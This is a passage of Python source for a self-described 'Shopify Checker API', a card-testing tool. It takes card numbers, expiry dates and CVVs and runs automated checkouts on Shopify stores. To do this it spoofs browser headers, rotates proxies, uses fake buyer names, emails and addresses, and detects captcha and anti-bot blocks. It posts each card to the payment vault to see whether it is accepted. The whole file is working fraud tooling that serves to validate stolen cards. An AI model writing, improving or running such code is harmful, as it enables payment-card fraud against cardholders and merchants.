"""
Shopify Checker API — High-Performance Build (v2.1, corrected)
==============================================================
Fixes in v2.1:
  • Vault response guard — check status + content-type + non-empty before json.loads
  • Vault retry — one extra attempt on non-JSON / empty responses
  • Specific vault error codes — vault_empty, vault_html, vault_status_XXX, vault_no_id
  • All prior v2 fixes retained (bounded queue, hard timeout, single-fire proposal)
"""

import asyncio
import aiohttp
import json
import re
import random
import html as html_module
import logging
import traceback
import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor, wait
from urllib.parse import urlparse
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.WARNING, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# ── Tunables ──────────────────────────────────────────────────────────────────
MAX_WORKERS       = int(os.getenv("MAX_WORKERS", "30"))
QUEUE_CAPACITY    = int(os.getenv("QUEUE_CAPACITY", "120"))
CONN_TIMEOUT      = int(os.getenv("CONN_TIMEOUT", "8"))
READ_TIMEOUT      = int(os.getenv("READ_TIMEOUT", "15"))
POLL_INITIAL      = float(os.getenv("POLL_INITIAL", "1"))
POLL_INTERVAL     = float(os.getenv("POLL_INTERVAL", "2"))
POLL_MAX          = int(os.getenv("POLL_MAX", "4"))
HARD_TIMEOUT      = int(os.getenv("HARD_TIMEOUT", "90"))

# ── Shared executor & counters ───────────────────────────────────────────────
_executor      = ThreadPoolExecutor(max_workers=MAX_WORKERS, thread_name_prefix="card")
_active_tasks  = 0
_queued_tasks  = 0
_task_lock     = threading.Lock()


# ── GraphQL queries (real Checkout Web protocol) ─────────────────────────────
QUERY_PROPOSAL_SHIPPING = (
    "query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$sessionInput:SessionTokenInput!,$checkpointData:String,"
    "$queueToken:String,$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,"
    "$attribution:AttributionInput,$captcha:CaptchaInput,"
    "$poNumber:String,$saleAttributions:SaleAttributionsInput)"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions},"
    "checkpointData:$checkpointData,queueToken:$queueToken,"
    "changesetTokens:$changesetTokens})"
    "{__typename result{"
    "...on NegotiationResultAvailable{checkpointData queueToken "
    "buyerProposal{...BuyerProposalDetails __typename}"
    "sellerProposal{...ProposalDetails __typename}__typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on Throttled{pollAfter queueToken pollUrl __typename}"
    "...on NegotiationResultFailed{__typename}__typename}"
    "errors{code localizedMessage nonLocalizedMessage localizedMessageHtml "
    "...on RemoveTermViolation{target __typename}"
    "...on AcceptNewTermViolation{target __typename}"
    "...on GenericError{__typename}"
    "...on PendingTermViolation{__typename}__typename}}__typename}}"
    "fragment BuyerProposalDetails on Proposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}"
    "fragment ProposalDetails on Proposal{"
    "delivery{...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{...on CompleteDeliveryStrategy{"
    "handle amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}"
    "payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{"
    "...on PaymentProvider{paymentMethodIdentifier name displayName extensibilityDisplayName __typename}"
    "...on OffsiteProvider{paymentMethodIdentifier name __typename}"
    "...on CustomOnsiteProvider{paymentMethodIdentifier name __typename}"
    "__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}"
    "tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}"
    "...on PendingTerms{pollDelay __typename}__typename}"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}"
)

QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{errors{"
    "...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}"
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token redirectUrl orderStatusPageUrl customerId isFirstOrder __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}"
    "timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationSchedulingFailure{__typename}"
    "...on DiscountUsageLimitExceededFailure{__typename}"
    "...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
    "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
    "...ReceiptDetails __typename}}"
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token redirectUrl orderStatusPageUrl customerId isFirstOrder __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}"
    "timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationSchedulingFailure{__typename}"
    "...on DiscountUsageLimitExceededFailure{__typename}"
    "...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"
)

if len(QUERY_PROPOSAL_SHIPPING) < 500:
    raise RuntimeError(f"QUERY_PROPOSAL_SHIPPING truncated ({len(QUERY_PROPOSAL_SHIPPING)} chars)")
if len(MUTATION_SUBMIT) < 500:
    raise RuntimeError(f"MUTATION_SUBMIT truncated ({len(MUTATION_SUBMIT)} chars)")
if len(QUERY_POLL) < 400:
    raise RuntimeError(f"QUERY_POLL truncated ({len(QUERY_POLL)} chars)")


# ── Address book ──────────────────────────────────────────────────────────────
C2C = {"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK",
       "GBP": "GB", "CHF": "CH", "AUD": "AU", "EUR": "DE", "SGD": "SG"}
BOOK = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080",
           "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3",
           "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001",
           "zoneCode": "MH", "countryCode": "IN", "phone": "+919876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "00000",
           "zoneCode": "DU", "countryCode": "AE", "phone": "+97150123456"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "999077",
           "zoneCode": "KL", "countryCode": "HK", "phone": "+85255555555"},
    "CN": {"address1": "8 Zhongguancun St", "city": "Beijing", "postalCode": "100080",
           "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Zurich", "postalCode": "6430",
           "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
           "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Alexanderplatz 1", "city": "Berlin", "postalCode": "10178",
           "zoneCode": "BE", "countryCode": "DE", "phone": "3012345678"},
    "SG": {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616",
           "zoneCode": "SG", "countryCode": "SG", "phone": "62201234"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080",
                "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}


def pick_addr(url, currency=None):
    try:
        tld = urlparse(url).netloc.split('.')[-1].upper()
        if tld in BOOK:
            return BOOK[tld]
    except Exception:
        pass
    if currency:
        cc = C2C.get(currency.upper())
        if cc and cc in BOOK:
            return BOOK[cc]
    return BOOK["DEFAULT"]


# ── Helpers ───────────────────────────────────────────────────────────────────
FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary",
               "Patricia", "Jennifer", "Linda"]
LAST_NAMES  = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
               "Miller", "Davis", "Rodriguez", "Wilson"]
DOMAINS_    = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]


def _rand_name():
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)


def _rand_email(f, l):
    return f"{f.lower()}.{l.lower()}{random.randint(1,999)}@{random.choice(DOMAINS_)}"


def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    proto = "http"
    for s in ("socks5://", "socks4://", "https://", "http://"):
        if p.lower().startswith(s):
            proto = s.rstrip("://")
            p = p[len(s):]
            break
    if "@" in p:
        return f"{proto}://{p}"
    parts = p.split(":")
    if len(parts) == 2:
        return f"{proto}://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        return f"{proto}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"{proto}://{p}"


def safe_parse(text, label=""):
    if not text:
        return None, f"empty_body({label})"
    if not isinstance(text, str):
        return None, f"non_string_body({label})"
    try:
        obj = json.loads(text)
    except json.JSONDecodeError as e:
        return None, f"json_decode({label}): {e} — snippet: {text[:80]}"
    if not isinstance(obj, dict):
        return None, f"non_dict({label}): {type(obj).__name__}"
    return obj, None


def _eb(text, start, end):
    if not text or start not in text:
        return None
    try:
        a = text.index(start) + len(start)
        b = text.index(end, a)
        return text[a:b] or None
    except ValueError:
        return None


_CARD_ERR_RE = re.compile(r'\b([A-Z][A-Z0-9]{2,}(?:_[A-Z0-9]{2,}){1,7})\b')


def extract_clean(msg):
    if not msg:
        return "UNKNOWN_ERROR"
    msg = str(msg)

    for pat in [r'"code"\s*:\s*"([^"]+)"', r"'code'\s*:\s*'([^']+)'"]:
        m = re.search(pat, msg)
        if m:
            c = m.group(1).strip()
            if c and len(c) < 64 and re.fullmatch(r'[A-Z0-9_]+', c):
                return c

    for pat in (r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'(CHECKOUT_[A-Z_]+)',
                r'(VAULT_[A-Z_]+)'):
        m = re.search(pat, msg)
        if m:
            return m.group(1)

    for m in _CARD_ERR_RE.finditer(msg):
        s = m.group(1)
        if s in ("HTTP", "HTTPS", "API", "ID", "UUID", "JSON"):
            continue
        if "_" not in s:
            continue
        return s

    return msg[:80]


CAPTCHA_MARKERS = (
    "CAPTCHA_REQUIRED", "CAPTCHA CHALLENGE", "HCAPTCHA", "H-CAPTCHA",
    "RECAPTCHA", "G-RECAPTCHA", "PERIMETERX", "PX_BLOCK", "AKAMAI_BLOCK",
    "DATADOME", "CF-CHALLENGE", "JUST A MOMENT",
)


def is_captcha(text):
    if not text:
        return False
    u = text.upper()
    return any(k in u for k in CAPTCHA_MARKERS)


def _safe_get(d, *keys, default=None):
    cur = d
    for k in keys:
        if not isinstance(cur, dict):
            return default
        cur = cur.get(k)
        if cur is None:
            return default
    return cur


# ── Core async flow ──────────────────────────────────────────────────────────
async def _gql(session, url, params, headers, body, proxy):
    try:
        raw = json.dumps(body, ensure_ascii=False).encode("utf-8")
        h = {**headers, "Content-Type": "application/json; charset=utf-8"}
        async with session.post(url, params=params, headers=h, data=raw, proxy=proxy) as r:
            return await r.text(), None
    except asyncio.TimeoutError:
        return None, "timeout"
    except Exception as e:
        return None, str(e)[:100]


_HASH_RE = re.compile(r'^[a-f0-9]{32,}$')


async def _session_token(response_obj, text, unesc, checkout_url):
    for hdr in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token",
                "X-Shopify-Checkout-Session-Token", "shopify-checkout-session-token"):
        v = response_obj.headers.get(hdr, "")
        if v and len(v) > 10:
            return v.strip()

    for src in (text, unesc):
        for pat in [
            r'"serializedSessionToken"\s*:\s*"([^"]{20,})"',
            r'"sessionToken"\s*:\s*"([^"]{20,})"',
            r'"checkoutSessionToken"\s*:\s*"([^"]{20,})"',
            r'session[-_]?[Tt]oken["\']?\s*:\s*["\']([^"\']{20,})["\']',
            r'"token"\s*:\s*"([a-zA-Z0-9_\-\.]{30,})"',
            r'serialized-sessionToken["\s]+content=["\']([^"\']{20,})["\']',
            r'data-session-token=["\']([^"\']{20,})["\']',
            r'"checkoutToken"\s*:\s*"([^"]{20,})"',
        ]:
            m = re.search(pat, src)
            if m:
                tok = m.group(1).strip()
                if len(tok) >= 20 and not _HASH_RE.match(tok):
                    return tok

    m = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9_\-]{20,})', checkout_url)
    if m and not m.group(1).isdigit():
        return m.group(1)
    return None


async def _fetch_products(domain, proxy):
    if not domain.startswith("http"):
        domain = "https://" + domain
    to = aiohttp.ClientTimeout(connect=CONN_TIMEOUT, sock_read=READ_TIMEOUT)
    conn = aiohttp.TCPConnector(ssl=False, limit=100)
    try:
        async with aiohttp.ClientSession(connector=conn, timeout=to) as s:
            async with s.get(f"{domain}/products.json", proxy=proxy) as r:
                if r.status != 200:
                    return None, f"products.json status {r.status}"
                data, err = safe_parse(await r.text(), "products.json")
                if err:
                    return None, err
                products = data.get("products", [])
                if not products:
                    return None, "no_products"
        best_price, best = float("inf"), None
        for p in products:
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    price = float(str(v.get("price", "0")).replace(",", ""))
                    if price < best_price:
                        best_price = price
                        best = {"variant_id": str(v["id"]),
                                "price": f"{price:.2f}",
                                "handle": p.get("handle", "")}
                except Exception:
                    continue
        if best:
            return best, None
        return None, "no_valid_variants"
    except Exception as e:
        return None, str(e)[:80]


async def _vault_card(session, cc, mes, ano, cvv, fn, ln, ourl, ident_sig, ua, proxy, debug):
    """
    Post card to PCI vault. Returns (token, err_code).
    Handles non-JSON responses robustly with one retry.
    """
    vault_hdrs = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://checkout.pci.shopifyinc.com",
        "Referer": "https://checkout.pci.shopifyinc.com/",
        "User-Agent": ua,
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin", "sec-fetch-storage-access": "active",
    }
    if ident_sig:
        vault_hdrs["shopify-identification-signature"] = ident_sig

    body = json.dumps({
        "credit_card": {
            "number": cc, "month": int(mes), "year": int(ano),
            "verification_value": cvv,
            "start_month": None, "start_year": None,
            "issue_number": "", "name": f"{fn} {ln}",
        },
        "payment_session_scope": urlparse(ourl).netloc,
    }, ensure_ascii=False).encode("utf-8")

    last_err = "vault_unknown"

    for attempt in range(2):
        try:
            async with session.post("https://checkout.pci.shopifyinc.com/sessions",
                                    data=body, headers=vault_hdrs, proxy=proxy) as vr:
                status = vr.status
                ctype  = vr.headers.get("Content-Type", "").lower()
                text   = await vr.text()
        except asyncio.TimeoutError:
            last_err = "vault_timeout"
            if debug:
                logger.warning(f"vault attempt {attempt+1}: timeout")
            continue
        except Exception as e:
            last_err = f"vault_net: {type(e).__name__}"
            if debug:
                logger.warning(f"vault attempt {attempt+1}: {last_err}")
            continue

        if status != 200:
            last_err = f"vault_status_{status}"
            if debug:
                logger.warning(f"vault attempt {attempt+1}: HTTP {status}, body={text[:120]}")
            continue

        if not text or not text.strip():
            last_err = "vault_empty"
            if debug:
                logger.warning(f"vault attempt {attempt+1}: empty body")
            continue

        text_s = text.strip()

        # HTML challenge or error page
        if text_s.startswith("<") or "text/html" in ctype:
            last_err = "vault_html"
            if debug:
                logger.warning(f"vault attempt {attempt+1}: html body: {text_s[:120]}")
            continue

        # Try JSON
        try:
            vj = json.loads(text_s)
        except json.JSONDecodeError as e:
            last_err = "vault_parse"
            if debug:
                logger.warning(f"vault attempt {attempt+1}: parse err: {e}, body={text_s[:120]}")
            continue

        if not isinstance(vj, dict):
            last_err = "vault_nondict"
            if debug:
                logger.warning(f"vault attempt {attempt+1}: non-dict: {type(vj).__name__}")
            continue

        token = vj.get("id")
        if token:
            return token, None

        # JSON but no id — usually an error payload
        err_obj = vj.get("error") or {}
        if isinstance(err_obj, dict):
            last_err = err_obj.get("code") or err_obj.get("message") or "vault_no_id"
        else:
            last_err = "vault_no_id"
        if debug:
            logger.warning(f"vault attempt {attempt+1}: no id, body={text_s[:150]}")
        # No point retrying a valid JSON error response
        return None, last_err

    return None, last_err


async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None,
                             proxy_str=None, debug=False):
    gateway, price, currency = "UNKNOWN", "0.00", "USD"

    ourl  = site_url if site_url.startswith("http") else f"https://{site_url}"
    proxy = parse_proxy(proxy_str) if proxy_str else None

    checkpoint_data = None
    running_total   = "0.00"
    payment_id      = None

    to   = aiohttp.ClientTimeout(connect=CONN_TIMEOUT, sock_read=READ_TIMEOUT)
    conn = aiohttp.TCPConnector(ssl=False, limit=200, limit_per_host=20)

    try:
        ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
        hdrs = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl, "Referer": ourl,
            "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        }

        addr = pick_addr(ourl, currency)
        cc_  = addr["countryCode"]
        fn, ln = _rand_name()
        email   = _rand_email(fn, ln)

        async with aiohttp.ClientSession(connector=conn, timeout=to) as session:

            # ── variant ────────────────────────────────────────────────
            if not variant_id:
                info, err = await _fetch_products(ourl, proxy)
                if err:
                    return False, err, gateway, price, currency
                variant_id = info["variant_id"]
                price      = info.get("price", "0.00")

            # ── add to cart ────────────────────────────────────────────
            cart_url = ourl + "/cart/add.js"
            ch = {**hdrs, "Content-Type": "application/x-www-form-urlencoded",
                  "Accept": "application/json, text/javascript"}
            try:
                cr = await session.post(cart_url, data=f"id={variant_id}&quantity=1",
                                        headers=ch, proxy=proxy)
                if cr.status != 200:
                    cr = await session.post(cart_url,
                                            json={"items": [{"id": int(variant_id), "quantity": 1}]},
                                            headers={**hdrs, "Content-Type": "application/json"},
                                            proxy=proxy)
                if cr.status != 200:
                    return False, f"cart_failed_{cr.status}", gateway, price, currency
            except Exception as e:
                return False, f"cart_error: {str(e)[:60]}", gateway, price, currency

            # ── checkout ───────────────────────────────────────────────
            chk_hdrs = {**hdrs,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin", "sec-fetch-user": "?1"}
            try:
                resp = await session.post(ourl + "/checkout/", allow_redirects=True,
                                          headers=chk_hdrs, proxy=proxy)
            except Exception as e:
                return False, f"checkout_error: {str(e)[:60]}", gateway, price, currency

            checkout_url = str(resp.url)
            if "login" in checkout_url.lower():
                return False, "site_requires_login", gateway, price, currency

            text  = await resp.text()
            unesc = html_module.unescape(text)

            atm = re.search(r"/checkouts/(?:cn/)?([^/?#\s]{8,})", checkout_url)
            attempt_token = atm.group(1).split("?")[0] if atm else None
            if not attempt_token:
                atm2 = re.search(r'"attemptToken"\s*:\s*"([^"]{8,})"', unesc)
                attempt_token = atm2.group(1) if atm2 else None
            if not attempt_token or len(attempt_token) < 8:
                return False, "no_attempt_token", gateway, price, currency

            sst = await _session_token(resp, text, unesc, checkout_url)
            if not sst:
                return False, "no_session_token", gateway, price, currency

            queue_token = _eb(unesc, '"queueToken":"', '"') or ""
            stable_id   = _eb(unesc, '"stableId":"', '"') or "1"

            merch = None
            for pat in [r"ProductVariantMerchandise/(\d+)",
                        r'"merchandiseId":"gid://shopify/ProductVariantMerchandise/(\d+)"']:
                m = re.search(pat, unesc)
                if m:
                    merch = m.group(1)
                    break
            if not merch:
                merch = str(variant_id)

            for pat in [r'"currencyCode":"([A-Z]{3})"', r'currencyCode":"([A-Z]{3})"']:
                m = re.search(pat, unesc)
                if m:
                    currency = m.group(1)
                    break

            subtotal = None
            for pat in [r'"subtotalBeforeTaxesAndShipping":\{"value":\{"amount":"([\d.]+)"',
                        r'subtotalBeforeTaxesAndShipping":{"value":{"amount":"([\d.]+)"']:
                m = re.search(pat, unesc)
                if m:
                    subtotal = m.group(1)
                    break
            if not subtotal:
                m = re.search(r'"price":\s*"([\d.]+)"', unesc)
                subtotal = m.group(1) if m else "0.01"

            build_id = None
            m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unesc)
            if m:
                build_id = m.group(1)

            src_tok = _eb(text, 'name="serialized-sourceToken" content="', '"')
            if src_tok:
                src_tok = src_tok.replace("&quot;", "").strip('"')

            ident_sig = None
            m = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unesc)
            if m:
                ident_sig = m.group(1)

            hdrs.update({
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })
            if build_id:
                hdrs["x-checkout-web-build-id"]        = build_id
                hdrs["x-checkout-web-deploy-stage"]    = "production"
                hdrs["x-checkout-web-server-handling"] = "fast"
                hdrs["x-checkout-web-server-rendering"] = "yes"
            if src_tok:
                hdrs["x-checkout-web-source-id"] = src_tok

            gql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
            gql_p   = {"operationName": "Proposal"}

            addr_payload = {
                "address1": addr["address1"], "address2": "",
                "city": addr["city"], "countryCode": cc_,
                "postalCode": addr["postalCode"], "firstName": fn,
                "lastName": ln, "zoneCode": addr["zoneCode"], "phone": addr["phone"],
            }

            proposal_vars = {
                "sessionInput": {"sessionToken": sst},
                "queueToken": queue_token,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {"deliveryLines": [{
                    "destination": {"partialStreetAddress": addr_payload},
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}},
                        "options": {}},
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True,
                }],
                    "noDeliveryRequired": [], "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True},
                "deliveryExpectations": {"deliveryExpectationLines": []},
                "merchandise": {"merchandiseLines": [{
                    "stableId": stable_id,
                    "merchandise": {"productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                        "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                        "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                    "lineComponentsSource": None, "lineComponents": []}]},
                "payment": {
                    "totalAmount": {"any": True}, "paymentLines": [],
                    "billingAddress": {"streetAddress": {
                        "address1": "", "city": "", "countryCode": cc_,
                        "lastName": "", "zoneCode": "ENG", "phone": ""}}},
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": cc_},
                    "email": email, "emailChanged": False, "phoneCountryCode": cc_,
                    "marketingConsent": [{"email": {"value": email}}],
                    "shopPayOptInPhone": {"countryCode": cc_}, "rememberMe": False},
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [],
                    "shippingScriptChanges": []},
                "optionalDuties": {"buyerRefusesDuties": False},
            }

            body1 = {"query": QUERY_PROPOSAL_SHIPPING, "operationName": "Proposal",
                     "variables": proposal_vars}
            t1, err1 = await _gql(session, gql_url, gql_p, hdrs, body1, proxy)
            if err1 or not t1:
                return False, f"proposal_failed: {err1}", gateway, price, currency
            if is_captcha(t1):
                return False, "CAPTCHA_REQUIRED", gateway, price, currency

            r1, e1 = safe_parse(t1, "proposal_shipping")
            if e1:
                return False, e1, gateway, price, currency
            if r1.get("errors"):
                msgs = [e.get("message", "") for e in r1["errors"][:2]]
                return False, f"gql_error: {'; '.join(msgs)[:120]}", gateway, price, currency

            negotiate = _safe_get(r1, "data", "session", "negotiate")
            if not isinstance(negotiate, dict):
                return False, "negotiate_null", gateway, price, currency

            result = negotiate.get("result")
            if not isinstance(result, dict):
                return False, "result_null", gateway, price, currency

            rtype = result.get("__typename", "")
            if rtype == "CheckpointDenied":
                return False, "checkpoint_denied", gateway, price, currency
            if rtype == "Throttled":
                return False, "throttled", gateway, price, currency
            if rtype == "NegotiationResultFailed":
                return False, "negotiation_failed", gateway, price, currency

            checkpoint_data = result.get("checkpointData")
            sp = result.get("sellerProposal")
            if not isinstance(sp, dict):
                return False, "seller_proposal_null", gateway, price, currency

            rt_data = sp.get("runningTotal")
            if isinstance(rt_data, dict):
                running_total = _safe_get(rt_data, "value", "amount", default="0.00")
            else:
                total_d = sp.get("total")
                running_total = _safe_get(total_d, "value", "amount", default="0.01") \
                                if isinstance(total_d, dict) else "0.01"

            dlv   = sp.get("delivery", {})
            d_stg = ""
            ship  = 0.0
            if isinstance(dlv, dict) and dlv.get("__typename") == "FilledDeliveryTerms":
                dls = dlv.get("deliveryLines", [])
                if dls and isinstance(dls[0], dict):
                    avail = dls[0].get("availableDeliveryStrategies", [])
                    if avail and isinstance(avail[0], dict):
                        d_stg = avail[0].get("handle", "")
                        ship  = float(_safe_get(avail[0], "amount", "value", "amount", default="0") or 0)

            tax = 0.0
            tax_d = sp.get("tax", {})
            if isinstance(tax_d, dict) and tax_d.get("__typename") == "FilledTaxTerms":
                tax = float(_safe_get(tax_d, "totalTaxAmount", "value", "amount", default="0") or 0)

            pay_d = sp.get("payment", {})
            if isinstance(pay_d, dict) and pay_d.get("__typename") == "FilledPaymentTerms":
                SKIP = {"ShopPayWalletConfig", "ApplePayWalletConfig", "GooglePayWalletConfig",
                        "FacebookPayWalletConfig", "ShopifyInstallmentsWalletConfig",
                        "PaypalWalletConfig", "AmazonPayClassicWalletConfig",
                        "WalletsPlatformConfiguration", "AnyRedeemablePaymentMethod",
                        "DeferredPaymentMethod"}
                for ln_ in (pay_d.get("availablePaymentLines") or []):
                    pm = ln_.get("paymentMethod", {})
                    if pm.get("__typename", "") in SKIP:
                        continue
